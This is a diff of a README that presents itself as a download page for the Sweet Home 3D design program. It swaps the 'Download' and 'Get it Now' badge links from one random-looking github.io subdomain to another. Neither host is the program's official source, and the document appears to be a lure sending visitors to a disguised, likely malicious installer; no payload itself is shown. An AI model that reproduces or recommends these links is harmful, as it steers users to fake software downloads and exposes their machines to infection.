@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://somovskoye.github.io/.github/sweetHome3D">
+  <a href="https://skalsd-oasd.github.io/.github/sweetHome3D">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Sweet Home 3D"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The automatic 2D-to-3D visualization is the feature that makes Sweet Home 3D pra
 
 <p align="center">
 
-[![Get it Now Sweet Home 3D](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/sweetHome3D)
+[![Get it Now Sweet Home 3D](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/sweetHome3D)
 
 </p>
 
